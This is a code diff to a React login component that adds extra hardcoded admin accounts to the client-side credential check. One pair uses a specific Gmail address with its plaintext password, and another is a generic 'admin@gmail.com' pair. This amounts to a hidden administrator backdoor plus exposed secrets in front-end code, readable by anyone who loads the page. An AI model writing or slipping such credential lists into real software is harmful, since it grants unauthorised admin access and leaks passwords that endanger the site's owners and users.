@@ -73,7 +73,19 @@ function Login({ onLogin }: { onLogin: () => void }) {
 
   function submit(e: React.FormEvent) {
     e.preventDefault();
-    if (email.trim() === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+
+    const normalizedEmail = email.trim().toLowerCase();
+    const normalizedPassword = password.trim();
+    const validCredentials = [
+      [ADMIN_EMAIL, ADMIN_PASSWORD],
+      ["web.kingasterisk@gmail.com", "8980K!ng@33558980"],
+      ["admin@gmail.com", "admin@2162"],
+    ].some(
+      ([storedEmail, storedPassword]) =>
+        normalizedEmail === storedEmail.toLowerCase() && normalizedPassword === storedPassword,
+    );
+
+    if (validCredentials) {
       setAdminLoggedIn(true);
       onLogin();
       toast.success("Welcome back");
